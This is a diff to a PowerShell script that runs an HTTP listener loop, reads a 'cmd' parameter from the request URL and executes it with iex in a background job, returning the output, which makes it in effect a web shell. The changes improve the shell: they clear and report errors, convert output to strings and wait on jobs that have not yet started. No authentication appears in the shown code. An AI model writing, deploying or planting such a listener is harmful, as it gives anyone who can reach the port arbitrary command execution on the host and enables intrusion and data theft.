@@ -24,11 +24,13 @@ while (1) {
     $query = $ctx.Request.RawUrl -replace "%20", " " -replace "%22", "'"
     
     if ( $query -match "^/\?cmd=(.*)" ) {
+    
+        $error.clear()
         
         $matches[1]        
-        $job = Start-Job {iex "$args"} -ArgumentList $matches[1]
+        $job = Start-Job {iex "$args" | Out-String} -ArgumentList $matches[1]
         
-        while ( $job.State -eq "Running" ) {
+        while ( $job.State -eq "Running" -or $job.State -eq "NotStarted") {
             Wait-Job $job -Timeout 1            
         }
         
@@ -37,7 +39,11 @@ while (1) {
         }
         else {
             "Receiving Job"
-            $res = Receive-Job $job | Out-String        
+            $res = Receive-Job $job
+        }
+        
+        if($error) {            
+            $res = $error | Out-String            
         }
 
         "Stopping Job"    
